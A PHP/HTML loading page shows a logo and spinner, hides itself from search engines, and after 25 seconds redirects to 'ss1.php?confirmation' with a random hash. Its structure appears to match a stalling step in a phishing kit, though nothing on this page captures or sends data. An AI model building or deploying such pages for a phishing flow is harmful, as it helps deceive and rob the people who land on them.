<?php

    include_once '../inc/app.php';
    $random   = rand(0,100000000000);
    $dispatch = substr(md5($random), 0, 17);
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title></title>
    </head>

    <body>

        <div class="logo text-center mt50 mb50">
            <img style="max-width: 180px;" src="../assets/images/logo.png">
        </div>
        
        <div id="details">
            <div class="top-border"></div>
            <div class="loader"><div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div></div>
        </div>

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            var dispatch = '<?php echo $dispatch; ?>';
            setTimeout(function () {
                window.location.href= 'ss1.php?confirmation#_'+ dispatch;
            },25000); // 1000 = 1s
        </script>

    </body>

</html>